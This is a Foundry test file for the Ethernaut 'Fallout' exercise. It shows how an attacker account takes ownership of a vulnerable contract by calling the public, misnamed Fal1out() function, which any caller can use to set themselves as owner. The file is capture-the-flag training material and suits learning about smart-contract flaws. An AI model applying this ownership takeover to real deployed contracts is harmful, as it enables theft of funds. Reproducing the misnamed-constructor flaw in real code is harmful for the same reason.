// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import{Test} from "forge-std/Test.sol";

import{Fallout} from "../src/Fallout.sol";

contract FalloutTest is Test {

    // Make Owner Of FallOut Contract
    address falloutOwner = makeAddr("onwer");
    address contributor1 = makeAddr("C1");
    address contributor2 = makeAddr("C2");
    address attacker  = makeAddr("Attacker");

    Fallout falloutContact;

    function setUp() public {
        
        falloutContact = new Fallout();

        // give Some Balance To Our Accounts

        vm.deal(falloutOwner, 2 ether);
        vm.deal(contributor1, 2 ether);
        vm.deal(contributor2, 2 ether);
        vm.deal(attacker, 1 ether);

        // lets call the Fal1out() function and 
        // set the falloutOwner as the FallOut Contract Owner

        vm.startPrank(falloutOwner);
        falloutContact.Fal1out{value: 1 ether}();
        vm.stopPrank();
     }


     function test_Sample() public {

        assertEq(falloutContact.owner() ,falloutOwner);
        assertEq(address(falloutContact).balance , 1 ether); // as we sent through 1 ether to the contract using Fal1out() from above setUp function

    } 
    function test_AttackAndTakeOwnerShip() public {
        // Contribut Some Ether to Contract
        uint256 amountToContribute = 1 ether;

        vm.startPrank(contributor1);
        falloutContact.allocate{value: amountToContribute}();
        vm.stopPrank();

        vm.startPrank(contributor2);
        falloutContact.allocate{value: amountToContribute}();
        vm.stopPrank();

        // Now The Contract Balance Should be 2 + 1 = 3 ether
        // 2 ether from two contributor and 1 from the owner who called Fallout() function from the setUp()

        assertEq(address(falloutContact).balance , 3 ether);

        //before Attack the Owner of The Contract Should be `falloutOnwer`

        assertEq(falloutContact.owner() , falloutOwner);

        /**
            An Attacker Sees The `Fallout`()

            ***
                function Fal1out() public payable {
                    owner = payable(msg.sender);
                    allocations[owner] = msg.value;
                }
            ***

            And Send a Liitle Amount of The Ether And Takes OwnerShip Of The Contract
         */

        // Attack

        vm.startPrank(attacker);
        falloutContact.Fal1out{value: 10 wei }(); // 10 wei =0.00000000000000001 ether
        vm.stopPrank();

        // after his call he should be the owner

        assertEq(falloutContact.owner() , attacker);
        assert(falloutContact.owner() != falloutOwner);



    }   


}